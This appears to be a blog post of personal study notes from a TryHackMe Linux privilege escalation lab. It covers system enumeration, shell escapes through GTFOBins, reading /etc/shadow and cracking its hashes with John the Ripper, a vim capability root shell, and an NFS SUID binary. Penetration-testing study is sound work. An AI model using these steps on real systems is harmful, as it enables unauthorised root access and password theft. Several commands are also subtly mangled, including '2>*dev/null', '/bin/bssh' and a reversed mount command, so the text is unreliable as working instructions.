---
id: privilege_escalation
aliases: []
tags:
  - tools
  - gtfo-bins
  - automated enumeration tools
  - commands
  - exploit-db
author: b3rdma
categories:
  - Linux
  - Privilege Escalation
date: '2025-02-01 20:22:01 +0000'
description: My notes from the THM Linux Privilege Escalation room
title: Linux Privilege Escalation
---
## Contents

<!-- toc -->

- [Enumeration](#enumeration)
  * [Useful Commands](#useful-commands)
- [Automated Enumeration Tools](#automated-enumeration-tools)
- [Get The Fuck Out Bins](#get-the-fuck-out-bins)
- [Cat Alternative](#cat-alternative)
- [Check for SUID/GUID](#check-for-suidguid)
- [Unshadow](#unshadow)
- [Capabilities](#capabilities)
- [Find Writable Folders](#find-writable-folders)
- [Path Env Variable](#path-env-variable)
- [Enumerate mountable network shares](#enumerate-mountable-network-shares)
- [Create and Compile](#create-and-compile)

<!-- tocstop -->

## Enumeration

Make sure to look at the Exploit DB once system information has been gathered - [Exploit-DB](https://www.exploit-db.com)

### Useful Commands

Some useful commands once access to a machine has been gained:

- `hostname` - can provide some information about the target's role within the organisation
- `uname -a` - provides information about the target's system such as the kernal; useful for searching for vulnerabilities
- `cat /proc/version` - provides information about the target's operating system such as kernal version and compilers installed (e.g. GCC)
- `cat /etc/issue` - provides information about the target's operating system such as the version
- `ps` - shows running processes on the target system. Useful flags include `aux`, `axjf`, `-A`
- `env` - shows environment variables
- `sudo -l` - shows sudo permissions for current user
- `ls -la` - list all files and directories on the target
- `id` - shows the user ID and group ID of the current user
- `cat /etc/passwd` - list all users on the target; better examples below:

```bash
cat /etc/passwd | cut -d ":" -f 1
```

{: .nolineno }

```bash
cat /etc/passwd | grep home
```

{: .nolineno }

- `history` - command history, may have passwords or usernames
- `ifconfig` - network interfaces information
- `ip route` - network routing information
- `netstat -a` - all listening ports and established connections
- `netstat -at` or `-au` - used to list TCP or UDP connections respectively
- `netstat -l` - lists all listening ports
- `netstat -s` - shows statistics on network usage
- `netstat -l -p` - list all listening ports and the processes using them
- `netstat -i` - show network interface statistics
- `netstat -ano` - show all connections (`-a`), do not resolve names (`-n`), display timers (`-o`)
- `find . -name flag1.txt` - find all files with the name `flag1.txt in the current directory
- `find /home -name flag1.txt` - find all files with the name flag1.txt in /home
- `find / -type d -name config` - find the directory named config in /
- `find / -type f -perm 0o777` - find all files with permissions of 777
- `find / -perm a=x` - find all files that can be executed
- `find /home -user frank` - find all files for user "frank" under /home
- `find / -mtime 10` - find files that were modified in the last 10 days
- `find / -atime 10` - find files that were accessed in the last 10 days
- `find / -cmin -60` - find files that were changed in the last 60 minutes
- `find / -amin -60` - find files that were accessed in the last 60 minutes
- `find / -size 50M` - find files that are 50MB in size; can be used with + or - to specify files larger or smaller than the given size
- `find / -size +100M -type f 2>/dev/null` - find files that are 100MB or larger and remove errors form being displayed by using `2>/dev/null`
- `find / -writable -type d 2>/dev/null` - find writable directories
- `find / -perm -222 -type d 2>/dev/null` - find writable directories
- `find / -perm -o w -type d 2>/dev/null` - find writable directories
- `find / -perm -o x -type d 2>/dev/null` - find executable directories
- `find / -name perl*`, `find / -name python*`, `find / -name gcc*` - find dev tools & supported languages
- `find / -perm -u=s -type f 2>/dev/null` - **find files with suid bit set; allows to run the file with higher privilege level than the current user**

## Automated Enumeration Tools

Links to various enumeration tools that are well worth learning to use:

- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) - LES
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [LinuxPrivChecker](https://github.com/linted/linuxprivchecker)

## Get The Fuck Out Bins

[GTFOBins](https://gtfobins.github.io) - legitimate functions of Unix binaries to break out of restrictive shells, escalate or maintain elevated privileges, etc.
Example of an awesome line that will grant sudo shell access:

```bash
find . -exec /bin/sh \; -quit
```

{: .nolineno }

## Cat Alternative

Excellent way to `cat` a file if privilege does not allow use of cat; try `base64` in the following way:

```bash
base64 /etc/shadow | base64 -d
```

{: .nolineno }

## Check for SUID/GUID

Use the command below to see what files have the SUID or GUID bit set:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

{: .nolineno }

Good practice is to compare the executables from the generated list with GTFOBins. Check for things like `base64` and `nano` when `cat` returns permission denied.

## Unshadow

Use the `unshadow` tool with _John the Ripper_ to crack passwords from the `/etc/shadow` file and the `/etc/passwd` file.

```bash
unshadow passwd.txt shadow.txt >passwords.txt
```

{: .nolineno }

```bash
john --wordlist=/usr/shares/wordlists/rockyou.txt passwords.txt
```

{: .nolineno }

> I have recently compared the performance of _John the Ripper_ with _Hashcat_ on my MBP. I cannot believe how damned fast _Hashcat_ is compared to _John_. Whenever I can, in future I shall always be using _Hashcat_ as a first choice. It blasted _John_ out of the water. In one test it cracked a BCrypt hash in seconds compared to _John_ taking what felt like a lifetime. If you're a fan of _John_ and have not really looked at _Hashcat_, I recommend you do.
> {: .prompt-tip }

## Capabilities

Use of _capabilities_ can be extremely useful for getting root privileges

```bash
getcap -r / 2>/dev/null
```

{: .nolineno }

The above command will show which executables have elevated capabilities. Use the list to check on GTFOBins for any binaries that may be vulnerable. Example for vim:

```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

{: .nolineno }

## Find Writable Folders

When finding writable folders, the output can be very long. Use the following to tidy up the output:

```bash
find / -writable 2>*dev/null | cut -d "*" -f 2 | sort -u
```

{: .nolineno }

Followed by something like...

```bash
find / -writable 2>*dev/null | grep usr | cut -d "*" -f 2,3 | sort -u
```

{: .nolineno }

or

```bash
find / -writable 2>*dev/null | cut -d "*" -f 2,3 | grep -v proc | sort -u
```

{: .nolineno }

## Path Env Variable

Add writable folders to the `$PATH` environment variable:

```bash
export PATH=$PATH:*home*<user>
```

{: .nolineno }

or

```bash
export PATH=$PATH:/tmp
```

{: .nolineno }

## Enumerate mountable network shares

```bash
showmount -e <target_ip>
```

{: .nolineno }

- Choose a "no_root_squash" folder to mount to from a temp folder:

```bash
mkdir /tmp/temp
```

{: .nolineno }

```bash
mount -o rw /tmp/temp <target_ip >:/tmp
```

{: .nolineno }

## Create and Compile

Create and compile an executable and then set the SUID bit

```bash
vim nfs.c
```

{: .nolineno }

```c
int main()
{ setgid(0);
setuid(0);
system("/bin/bssh");
return 0;
}
```

{: .nolineno }

```bash
gcc nfs.c -o nfs -w
```

{: .nolineno }

```bash
chmod +s nfs
```

{: .nolineno }

